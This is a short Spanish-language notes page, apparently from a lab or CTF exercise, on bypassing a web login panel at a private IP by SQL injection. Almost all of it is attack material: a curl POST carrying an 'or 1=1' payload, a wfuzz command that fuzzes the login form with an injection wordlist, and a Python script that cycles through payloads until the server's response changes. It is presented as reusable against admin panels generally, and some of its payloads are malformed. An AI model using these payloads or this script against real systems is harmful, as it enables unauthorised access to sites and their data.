---
title : Web-Panel-Sql
published : True
---
* <p> Sql injection en panel de login</p>

```python
#Injeccion sql en panel administrador, desde petenciones con curl:
curl -s -X POST "http://10.10.254.165/login.php" -d "username='|| or 1=1-- - &password=-- -" -i

#Injeccion sql en base a un wordlist de injeccion sql:
wfuzz -t 20 -c -z file,wordlists.txt -d "username=FUZZ\&password=FUZZ" http://10.10.254.165/login.php
```
* <p>Sabiendo estos datos puedo crear perfectamente un script en python que aplique injeccion sql en paneles administradores</p>
<p></p>
```python
#!/usr/bin/python
import requests

id_username = 'username'
id_password = 'password'
url = 'http://10.10.254.165/login.php'
 
sql_payload = [

    "' or 1=1-- -",
    "' || or 1=1-- -",
    "' 1=1-- -"

]
for list in sql_payload:
    datos = requests.post(url, data={id_username : list, id_password : list}, allow_redirects=False)
    if datos.status_code != 200:
        print("[+] Injection sql sucess :", list)
        exit()
    print("Failed : ", datos.status_code, list)


```
